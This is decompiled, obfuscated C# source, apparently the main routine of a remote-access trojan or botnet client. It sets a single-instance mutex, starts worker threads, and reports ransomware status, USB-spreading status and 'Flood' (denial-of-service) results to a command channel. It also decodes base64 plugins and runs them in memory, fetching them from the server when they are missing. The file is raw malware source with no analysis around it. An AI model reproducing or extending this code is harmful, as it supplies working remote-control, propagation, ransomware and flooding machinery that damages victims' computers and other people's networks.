using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;
using ns1;
using ns10;
using ns12;
using ns2;
using ns3;
using ns4;
using ns5;
using ns6;
using ns7;
using ns9;

namespace ns11;

public class GClass10
{
	public static object object_0 = GClass3.string_4;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		try
		{
			for (int num = GClass3.int_1; num != 0; num = checked(num - 1))
			{
				Thread.Sleep(1000);
			}
			bool createdNew = false;
			GClass3.mutex_0 = new Mutex(initiallyOwned: true, GClass1.smethod_5(), out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			if (GClass3.bool_2)
			{
				GClass0.smethod_0();
			}
			GClass9.smethod_0();
			GClass6.thread_0.Start();
			if (GClass3.bool_0)
			{
				new Thread(smethod_1).Start();
			}
			if (GClass3.bool_1)
			{
				new Thread(smethod_2).Start();
			}
			new Thread(smethod_0).Start();
			new Thread(GClass8.smethod_0).Start();
			if (GClass3.string_8.Length > 25)
			{
				Thread thread = new Thread(GClass2.smethod_0);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}
			GClass4.smethod_0();
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(Class0.smethod_6));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("coredll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void SystemIdleTimerReset();

	private static void smethod_0()
	{
		Thread.Sleep(5000);
		string text = Conversions.ToString(GClass1.smethod_8());
		string text2 = Conversions.ToString(GClass1.smethod_9());
		string text3 = "...";
		string text4 = Conversions.ToString(GClass1.smethod_13());
		GClass11.smethod_0();
		while (true)
		{
			int num = 1;
			if (!GClass6.bool_0)
			{
				Thread.Sleep(5000);
				continue;
			}
			Thread.Sleep(3000);
			try
			{
				if (Operators.CompareString(text, Class0.smethod_3("Rans-Status"), false) != 0)
				{
					text = Class0.smethod_3("Rans-Status");
					GClass6.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!R", object_0), (object)text)));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (GClass3.bool_0 && Operators.CompareString(text2, Class0.smethod_3("USB").ToString(), false) != 0)
				{
					text2 = Class0.smethod_3("USB");
					GClass6.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!SP", object_0), (object)text2)));
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text3, GClass1.smethod_12(), false) != 0)
				{
					text3 = GClass1.smethod_12();
					GClass6.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!X", object_0), (object)text3)));
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text4, Class0.smethod_3("Flood").ToString(), false) != 0)
				{
					text4 = Class0.smethod_3("Flood");
					GClass6.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"MSG", object_0), (object)"Flood! "), (object)text4)));
					text4 = "";
					Class0.smethod_4("Flood", "");
				}
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4, num);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void smethod_1()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_3("_USB"), (string)null, false) == 0)
			{
				while (!GClass6.bool_0)
				{
					Thread.Sleep(5000);
				}
				Thread.Sleep(9000);
				GClass6.smethod_3("PLUSB");
			}
			else
			{
				byte[] byte_ = Convert.FromBase64String(Class0.smethod_3("_USB"));
				bool bool_ = false;
				GClass5.smethod_1(Class0.smethod_7(byte_, ref bool_));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"_USB Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_2()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_3("_PIN"), (string)null, false) == 0)
			{
				while (!GClass6.bool_0)
				{
					Thread.Sleep(5000);
				}
				Thread.Sleep(11000);
				GClass6.smethod_3("PLPIN");
			}
			else
			{
				byte[] byte_ = Convert.FromBase64String(Class0.smethod_3("_PIN"));
				bool bool_ = false;
				GClass5.smethod_1(Class0.smethod_7(byte_, ref bool_));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"_PIN Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}
}
